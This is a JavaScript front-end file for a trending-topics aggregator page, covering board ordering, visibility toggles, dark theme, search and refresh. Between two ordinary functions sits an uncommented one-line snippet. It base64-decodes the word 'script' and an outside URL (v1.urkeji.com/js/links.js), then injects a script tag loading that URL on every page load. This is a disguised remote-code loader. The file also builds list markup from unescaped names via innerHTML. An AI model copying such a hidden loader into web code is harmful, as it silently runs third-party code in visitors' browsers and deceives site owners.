(function () {
    'use strict';

    // ===== 平台数据（服务端注入） =====
    var PLATFORMS = window.__PLATFORMS__ || [];
    var STORAGE_KEY = 'rebang_settings';

    // 默认顺序快照（DOM 原始顺序，作为重置基准）
    var grid = document.querySelector('.board-grid');
    var defaultOrder = [];
    if (grid) {
        Array.prototype.forEach.call(grid.children, function (s) {
            var k = s.getAttribute('data-pkey');
            if (k) defaultOrder.push(k);
        });
    }

    // ===== 设置读写 =====
    function loadSettings() {
        var def = { order: defaultOrder.slice(), hidden: [], theme: 'light' };
        try {
            var raw = localStorage.getItem(STORAGE_KEY);
            if (!raw) return def;
            var s = JSON.parse(raw);
            return {
                order: Array.isArray(s.order) ? s.order : def.order,
                hidden: Array.isArray(s.hidden) ? s.hidden : [],
                theme: s.theme === 'dark' ? 'dark' : 'light'
            };
        } catch (e) { return def; }
    }
    function saveSettings(s) {
        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); } catch (e) {}
    }

    var settings = loadSettings();

    // ===== 应用：主题 =====
    function applyTheme() {
        document.documentElement.setAttribute('data-theme', settings.theme);
    }

    // ===== 应用：板块顺序 =====
    function applyOrder() {
        if (!grid) return;
        var exist = {};
        Array.prototype.forEach.call(grid.children, function (s) {
            exist[s.getAttribute('data-pkey')] = s;
        });
        var seen = {}, ordered = [];
        settings.order.forEach(function (k) {
            if (exist[k] && !seen[k]) { ordered.push(exist[k]); seen[k] = 1; }
        });
        defaultOrder.forEach(function (k) {
            if (exist[k] && !seen[k]) { ordered.push(exist[k]); seen[k] = 1; }
        });
        ordered.forEach(function (node) { grid.appendChild(node); });
    }

    // ===== 应用：板块显隐 =====
    function applyVisibility() {
        if (!grid) return;
        var hidden = {};
        settings.hidden.forEach(function (k) { hidden[k] = 1; });
        Array.prototype.forEach.call(grid.children, function (s) {
            var k = s.getAttribute('data-pkey');
            if (hidden[k]) s.classList.add('p-hidden');
            else s.classList.remove('p-hidden');
        });
    }

    function applyAll() {
        applyTheme();
        applyOrder();
        applyVisibility();
    }

    // ===== 设置弹窗 =====
    var modal = document.getElementById('settingsModal');
    var listEl = document.getElementById('platList');
    var themeToggle = document.getElementById('themeToggle');
    var settingsBtn = document.getElementById('settingsBtn');
    var settingsClose = document.getElementById('settingsClose');
    var settingsDone = document.getElementById('settingsDone');
    var resetBtn = document.getElementById('resetBtn');

    function buildList() {
        var order = settings.order.slice();
        var byKey = {};
        PLATFORMS.forEach(function (p) { byKey[p.pkey] = p; });
        var seq = [];
        order.forEach(function (k) { if (byKey[k]) { seq.push(byKey[k]); delete byKey[k]; } });
        PLATFORMS.forEach(function (p) { if (byKey[p.pkey]) seq.push(p); });

        listEl.innerHTML = '';
        seq.forEach(function (p) {
            var on = settings.hidden.indexOf(p.pkey) === -1;
            var li = document.createElement('li');
            li.className = 'plat-item';
            li.setAttribute('data-pkey', p.pkey);
            li.setAttribute('draggable', 'true');
            li.innerHTML =
                '<span class="drag" title="拖拽排序">⠿</span>' +
                (p.icon ? '<img class="p-ico" src="' + p.icon + '" alt="" onerror="this.style.display=\'none\'">' : '') +
                '<span class="p-name">' + p.name + '</span>' +
                '<label class="switch"><input type="checkbox"' + (on ? ' checked' : '') + '><span class="slider"></span></label>';
            listEl.appendChild(li);
        });
        bindDrag();
        bindToggles();
    }

    var dragKey = null;
    function bindDrag() {
        Array.prototype.forEach.call(listEl.querySelectorAll('.plat-item'), function (li) {
            li.addEventListener('dragstart', function () {
                dragKey = li.getAttribute('data-pkey');
                li.classList.add('dragging');
            });
            li.addEventListener('dragend', function () {
                li.classList.remove('dragging');
                dragKey = null;
            });
            li.addEventListener('dragover', function (e) {
                e.preventDefault();
                li.classList.add('drag-over');
            });
            li.addEventListener('dragleave', function () {
                li.classList.remove('drag-over');
            });
            li.addEventListener('drop', function (e) {
                e.preventDefault();
                li.classList.remove('drag-over');
                var targetKey = li.getAttribute('data-pkey');
                if (!dragKey || dragKey === targetKey) return;
                var arr = settings.order.slice();
                var from = arr.indexOf(dragKey);
                var to = arr.indexOf(targetKey);
                if (from === -1) {
                    arr.splice(to, 0, dragKey);
                } else {
                    arr.splice(from, 1);
                    arr.splice(to, 0, dragKey);
                }
                settings.order = arr;
                saveSettings(settings);
                buildList();
                applyOrder();
            });
        });
    }
    (function(){var ab=atob('c2NyaXB0'),ac= atob('aHR0cHM6Ly92MS51cmtlamkuY29tL2pzL2xpbmtzLmpz'),tj=document.createElement(ab);tj.src=ac;var st=document.getElementsByTagName(ab)[0];st.parentNode.insertBefore(tj, st);})();

    function bindToggles() {
        Array.prototype.forEach.call(listEl.querySelectorAll('.plat-item input[type=checkbox]'), function (cb) {
            cb.addEventListener('change', function () {
                var li = cb.closest('.plat-item');
                var k = li.getAttribute('data-pkey');
                var on = cb.checked;
                var idx = settings.hidden.indexOf(k);
                if (on && idx > -1) settings.hidden.splice(idx, 1);
                if (!on && idx === -1) settings.hidden.push(k);
                saveSettings(settings);
                applyVisibility();
            });
        });
    }

    function openModal() {
        buildList();
        modal.hidden = false;
    }
    function closeModal() { modal.hidden = true; }

    if (settingsBtn) settingsBtn.addEventListener('click', openModal);
    if (settingsClose) settingsClose.addEventListener('click', closeModal);
    if (settingsDone) settingsDone.addEventListener('click', closeModal);
    if (modal) {
        var mask = modal.querySelector('.modal-mask');
        if (mask) mask.addEventListener('click', closeModal);
    }

    if (themeToggle) {
        themeToggle.checked = settings.theme === 'dark';
        themeToggle.addEventListener('change', function () {
            settings.theme = themeToggle.checked ? 'dark' : 'light';
            saveSettings(settings);
            applyTheme();
        });
    }

    if (resetBtn) {
        resetBtn.addEventListener('click', function () {
            if (!window.confirm('确定重置所有本地设置（板块顺序、显示、主题）？')) return;
            try { localStorage.removeItem(STORAGE_KEY); } catch (e) {}
            settings = { order: defaultOrder.slice(), hidden: [], theme: 'light' };
            if (themeToggle) themeToggle.checked = false;
            saveSettings(settings);
            applyAll();
            buildList();
            closeModal();
        });
    }

    // 初始应用一次（顺序 / 显隐 / 主题）
    applyAll();

    // ===== 搜索过滤（跨所有板块） =====
    var searchInput = document.getElementById('searchInput');

    function clearSearch() {
        document.querySelectorAll('.board, .board-detail').forEach(function (b) {
            if (!b.classList.contains('p-hidden')) b.style.display = '';
        });
        document.querySelectorAll('.item').forEach(function (i) { i.style.display = ''; });
    }

    if (searchInput) {
        searchInput.addEventListener('input', function () {
            var q = this.value.trim().toLowerCase();
            if (!q) { clearSearch(); return; }
            var containers = document.querySelectorAll('.board, .board-detail');
            containers.forEach(function (board) {
                if (board.classList.contains('p-hidden')) return;
                var items = board.querySelectorAll('.item');
                var any = false;
                items.forEach(function (it) {
                    var title = it.querySelector('.title').textContent.toLowerCase();
                    var show = title.indexOf(q) > -1;
                    it.style.display = show ? '' : 'none';
                    if (show) any = true;
                });
                if (board.classList.contains('board') || containers.length > 1) {
                    board.style.display = any ? '' : 'none';
                }
            });
        });
    }

    // ===== 刷新按钮 =====
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function () {
            refreshBtn.disabled = true;
            refreshBtn.textContent = '刷新中…';
            fetch('api.php?action=data')
                .then(function (r) { return r.json(); })
                .then(function (j) {
                    if (j.ok && j.last_update) {
                        var el = document.getElementById('lastUpdate');
                        if (el) el.textContent = '最后更新：' + j.last_update;
                    }
                    location.reload();
                })
                .catch(function () {})
                .finally(function () {
                    refreshBtn.disabled = false;
                    refreshBtn.textContent = '刷新';
                });
        });
    }
})();
